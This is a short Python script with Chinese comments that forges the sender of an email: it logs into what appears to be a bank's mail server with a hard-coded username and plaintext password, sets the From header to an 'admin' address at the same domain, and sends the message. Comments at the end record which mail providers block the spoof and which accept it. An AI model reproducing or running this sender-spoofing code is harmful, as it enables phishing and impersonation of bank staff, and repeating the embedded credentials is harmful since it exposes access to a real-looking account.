import smtplib
from email.header import Header
from email.mime.text import MIMEText

################真实信息################
# 发送邮箱服务器
smtpserver = 'mail.wzbank.cn'
# 发送邮箱用户/密码
real_sender = '05343@wzbank.cn'
real_password = 'Wzllm1988'

# 接收邮箱
real_receiver = 'wy1407@wzbank.cn'
# 发送邮件主题
subject = 'Python email forgery'

################构造信息################
# 编写HTML类型的邮件正文，可选HTML等改变格式
msg = MIMEText('This is a forgery email !')
msg['Subject'] = Header(subject, 'utf-8')
msg['To'] = Header(real_receiver)

# 伪造部分
forgery_sender = "admin@wzbank.cn"
msg['From'] = Header(forgery_sender)

# 连接发送邮件
smtp = smtplib.SMTP()
smtp.connect(smtpserver)
smtp.login(real_sender, real_password)
smtp.sendmail(real_sender, real_receiver, msg.as_string())
smtp.quit()

# 网易邮箱和QQ邮箱都会显示是谁代发
# outlook会直接拒收
# gmail会发送成功，并且成功伪造